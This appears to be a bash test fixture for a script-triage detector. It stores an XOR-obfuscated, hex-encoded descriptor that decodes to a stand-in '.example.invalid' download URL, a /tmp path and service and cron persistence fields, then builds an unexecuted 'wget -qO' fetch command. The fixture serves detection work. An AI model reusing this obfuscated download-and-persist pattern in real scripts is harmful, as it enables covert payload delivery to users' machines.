#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_290f3a18='fa:b1:bd:f0:ff:f8:e9:fc:ff:b1:ed:ef:fd:f9:e5:fe:e9:d3:fe:e9:e1:e3:f8:e9:a0:fb:fe:e5:f8:e9:d3:ea:e5:e0:e9:f0:ed:e8:ed:fc:f8:e9:fe:b1:fb:eb:e9:f8:d3:e3:f9:f8:fc:f9:f8:f0:ff:f8:ed:eb:e9:d3:ef:e3:f9:e2:f8:b1:bd:f0:ef:ed:e1:fc:ed:e5:eb:e2:d3:e5:e8:b1:ef:ed:e1:fc:ed:e5:eb:e2:a1:be:ef:e9:ea:bf:b8:bb:e8:bf:ed:f0:f9:fe:e0:b1:e4:f8:f8:fc:ff:b6:a3:a3:be:ef:e9:ea:bf:b8:bb:e8:bf:ed:a2:e9:f4:ed:e1:fc:e0:e9:a2:e5:e2:fa:ed:e0:e5:e8:a3:ba:e9:bf:ba:b4:bc:e8:b9:a2:ff:e4:f0:f9:ff:e9:fe:d3:ed:eb:e9:e2:f8:b1:c4:f9:e2:f8:fe:e9:ff:ff:c0:ed:ee:a3:be:ef:e9:ea:bf:b8:bb:e8:bf:ed:f0:ea:e5:e0:e9:d3:fc:ed:f8:e4:b1:a3:f8:e1:fc:a3:e4:f9:e2:f8:fe:e9:ff:ff:a1:ef:ed:ef:e4:e9:a3:a2:ff:f8:ed:eb:e9:a1:be:ef:e9:ea:bf:b8:bb:e8:bf:ed'
  readonly Codec_290f3a18='hex_colon|single_byte_xor|8c'

  Load_290f3a18() {
    EnCoDeD_Bytes=()
    local IFS=':' PaRt
    local -a pieces
    read -r -a pieces <<< "${Material_290f3a18}"
    for PaRt in "${pieces[@]}"; do EnCoDeD_Bytes+=("$((16#$PaRt))"); done
  }

  Decode_290f3a18() {
    DeCoDeD_Bytes=()
    local InDeX
    for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
      DeCoDeD_Bytes+=("$((EnCoDeD_Bytes[InDeX] ^ 140))")
    done
  }

  Recover_290f3a18() {
    local -a EnCoDeD_Bytes DeCoDeD_Bytes
    local DeScRiPtOr_Text NeUtRaL PaSs InDeX
    local -a compass=(north south); NeUtRaL="$(IFS=:; printf '%s' "${compass[*]}")"
    Load_290f3a18
    Decode_290f3a18
    DeScRiPtOr_Text=''
    local octal character
    for InDeX in "${!DeCoDeD_Bytes[@]}"; do
      printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
      printf -v character '%b' "\\$octal"
      DeScRiPtOr_Text+="$character"
    done
    printf '%s\n' "$DeScRiPtOr_Text"
  }

  Inspect_290f3a18() { local recovered field; local -a fields; recovered="$(Recover_290f3a18)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

  Plan_290f3a18() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_290f3a18)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(wget -qO "$file_path" "$url")
    declare -p request_command
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_290f3a18; fi
